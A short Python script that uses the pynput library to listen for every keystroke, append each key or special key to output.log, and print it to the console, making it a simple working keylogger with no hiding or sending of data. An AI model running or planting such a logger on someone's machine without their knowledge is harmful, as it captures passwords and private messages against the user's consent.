from pynput import keyboard

def on_press(key):

    try:
        # Open the file in append mode ('a')
        with open("output.log", "a") as file:
            file.write(f'{key.char}\n')

        print(f'Key pressed: {key.char}\n')

    except AttributeError:
        with open("output.log", "a") as file:
            file.write(f'Special key pressed: {key}\n')

        print(f'Special key pressed: {key}\n')

listener = keyboard.Listener(on_press=on_press)

listener.start()

listener.join()  